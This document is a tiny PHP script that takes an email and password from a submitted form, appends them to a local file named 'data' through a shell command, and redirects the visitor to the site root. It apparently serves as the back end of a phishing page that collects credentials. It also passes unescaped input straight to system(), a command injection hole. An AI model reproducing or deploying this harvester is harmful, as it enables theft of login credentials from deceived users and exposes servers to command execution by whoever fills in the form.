<?php
$email=$_POST["email"];
$pass=$_POST["pass"];
system("echo '$email	:	$pass' >> data");
header('location:/')
?>
